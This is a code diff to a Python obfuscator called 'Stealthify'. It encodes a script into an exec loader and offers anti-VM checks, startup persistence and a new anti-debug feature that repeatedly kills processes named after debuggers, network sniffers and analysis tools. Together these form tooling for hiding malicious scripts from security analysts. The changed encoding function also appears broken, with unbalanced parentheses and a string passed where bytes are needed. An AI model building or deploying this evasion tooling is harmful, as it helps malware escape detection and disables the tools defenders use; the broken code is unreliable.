@@ -3,7 +3,7 @@ from colorama import Fore as f
 
 os.system("cls")
 
-class Obfuscator(ast.NodeTransformer):
+class Stealthfiy(ast.NodeTransformer):
     def __init__(self):
         self.mapping = {}
         self.function_parameters = {}
@@ -12,6 +12,14 @@ class Obfuscator(ast.NodeTransformer):
         if name not in self.mapping:
             self.mapping[name] = "".join(random.choice(["I", "l"]) for _ in range(35))
         return self.mapping[name]
+
+    def visit_Import(self, node):
+        for alias in node.names:
+            if alias.asname:
+                obfuscated_name = self.obfuscate_name(alias.asname)
+                self.mapping[alias.asname] = obfuscated_name
+                alias.asname = obfuscated_name
+        return self.generic_visit(node)
 
     def visit_FunctionDef(self, node):
         for arg in node.args.args:
@@ -40,6 +48,12 @@ class Obfuscator(ast.NodeTransformer):
 
         return self.generic_visit(node)
 
+    def visit_ClassDef(self, node):
+        obfuscated_name = self.obfuscate_name(node.name)
+        self.mapping[node.name] = obfuscated_name
+        node.name = obfuscated_name
+        return self.generic_visit(node)
+
     def visit_Return(self, node):
         if isinstance(node.value, ast.Name) and node.value.id in self.mapping:
             node.value.id = self.mapping[node.value.id]
@@ -52,9 +66,17 @@ class Obfuscator(ast.NodeTransformer):
             node.name = obfuscated_name
         return self.generic_visit(node)
 
-def obfuscate_code(code, iterations):
+    def visit_With(self, node):
+        node.items = [self.visit(item) for item in node.items]
+        return self.generic_visit(node)
+
+    def visit_Global(self, node):
+        node.names = [self.obfuscate_name(name) for name in node.names]
+        return node
+
+def Stealth(code, iterations):
     tree = ast.parse(code)
-    obfuscator = Obfuscator()
+    obfuscator = Stealthfiy()
     for _ in range(iterations):
         obfuscator.visit(tree)
     obfuscated_code = ast.unparse(tree)
@@ -73,15 +95,13 @@ def Add_Dead_code(code):
 def Stealthcrypt(content):
     CMARK = '__STEALTHIFY__V2__' * 15
     COFFSET = 10
-    marshaled_data = marshal.dumps(content.encode())
-    compressed_data = zlib.compress(marshaled_data)
-    encoded_data = base64.b85encode(compressed_data).decode()
-    b64_encoded_data = base64.b64encode(encoded_data.encode()).decode()
+    zlib_data = zlib.compress(content)
+    b64_encoded_data = base64.b64encode(zlib_data).decode()
     code = f'{CMARK} = ""\n'
     for i in range(0, len(b64_encoded_data), COFFSET):
         chunk = b64_encoded_data[i:i+COFFSET]
         code += f'{CMARK} += "{chunk}"\n'
-    code += f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__import__('base64').b64decode({CMARK}.encode()).decode()))))"
+    code += f"exec(__import__('\\x7A\\x6C\\x69\\x62').decompress(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b64decode({CMARK}.encode()).decode()))))"
     return code
 
 try:
@@ -99,6 +119,7 @@ try:
     antivm = input(f.RED + "Enable Anti VM? [yes/no]: ")  
     add_junk = input("Add Dead Code? [yes/no]: ")
     startup = input("Use Startup? [yes/no]: ")
+    anti_debug = input("Use Anti-Debug? [yes/no]: ")
     use_Stealthcrypt = input(f.RED + "Use Encoding And Encryption? [yes/no]: ")
 
     try:
@@ -108,7 +129,7 @@ try:
         print(f.RED + "File not found. Please provide a valid file path.")
         sys.exit(1)
     
-    obfuscated_code = obfuscate_code(code, iterations)
+    obfuscated_code = Stealth(code, iterations)
     
     if antivm.lower() == 'yes':
         obfuscated_code += """
@@ -119,6 +140,42 @@ def in_virtualenv():
     return get_base_prefix_compat() != sys.prefix
 if in_virtualenv() == True:
     sys.exit()
+"""
+
+    if anti_debug.lower() == 'yes':
+        obfuscated_code += """
+import threading,time,psutil,os
+keywords = [
+    'Fiddler', 'WireShark','dnSpy', 'HTTPDebuggerUI','x32dbg', 'x64dbg', 'DotNetReactor', 'HTTPDebuggerSvc', 'HTTPDebuggerUI',
+    'ida', 'scylla', 'idag',
+    'scylla', 'scylla_x64', 'scylla_hide', 'scylla_x64_hide',
+    'scylla_x86', 'scylla_x86_hide', 'scylla_x64_hide',
+    'scylla_x64', 'scylla_x64_hide',
+    'scylla_hide', 'scylla_x86_hide',
+    'ImmunityDebugger', 'MegaDumper',
+    'debug', 'imdmp', 'graywolf', 'packets', 'memory', 'analyzing', 'debugging', 'process', 'managem', 'memor',
+    'dede', 'refs', 'procdump', 'netchk', 'netLim', 'sandbox',
+    'OllyDbg', 'OllyICE', 'x64dbg', 'TitanHide', 'Salamander', 'SmartCheck', 'ReFox', 'ReClass', 'PhantOm',
+    'PETools', 'PE Explorer', 'OllyDump', 'MegaDumper', 'IDA Pro', 'HWiNFO', 'Guardian', 'Enigma Protector',
+    'DebugShield', 'Code Virtualizer', 'CFF Explorer', 'IdaTools', 'IDA Stealer', 'OllyDumpEx', 'OllyHeapTrace',
+    'PEiD', 'PE-Scrambler', 'PE-Sieve', 'ScyllaHide', 'PE-bear', 'PE-bear-x64', 'PE-bear-x86', 'PEInfo', 'PEStudio',
+    'PEView', 'Protection ID', 'Stud_PE', 'UPX', 'IDA Plugin', 'PE Tools', 'PEview', 'IDA Pro', 'x64dbg',
+    'x32dbg', 'OllyDbg', 'OllyICE', 'ScyllaHide', 'PE-sieve', 'IDA', 'IDA64', 'ImmDbg', 'IMMUNITY',
+    'OllyDumpEx', 'RDG Packer Detector', 'LimeCrypt', 'HWiNFO', 'Sysinternals', 'SysAnalyzer', 'IDA Python',
+    'PEDumper', 'PEDump', 'PE Inspector', 'IDA Plugin', 'ScyllaSSA', 'DumpME', 'Scylla_x64', 'Scylla_x86',
+    'Scylla_x64_x86', 'IDA_PRO', 'ScyllaHide_x64', 'ScyllaHide_x86', 'ScyllaHide_x64_x86', 'ScyllaHide_x86_x64'
+]
+def check_processes():
+    while True:
+        try:
+            for process in psutil.process_iter():
+                for keyword in keywords:
+                    if keyword.lower() in process.name().lower():
+                        process.kill()
+        except Exception:
+            pass
+        time.sleep(0.5)
+threading.Thread(target=check_processes, daemon=True).start()
 """
 
     if startup.lower() == 'yes':
